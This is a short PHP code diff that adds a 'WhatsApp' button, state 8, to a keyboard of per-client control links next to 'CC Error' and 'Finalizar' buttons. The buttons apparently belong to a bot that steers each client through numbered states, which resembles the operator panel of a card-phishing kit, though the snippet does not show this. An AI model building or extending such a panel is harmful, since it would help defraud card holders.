@@ -106,6 +106,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 [
                     ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"],
                     ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=7&key=$security_key"],
+                ],
+                [
+                    ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$clienteId&estado=8&key=$security_key"]
                 ]
             ]
         ];
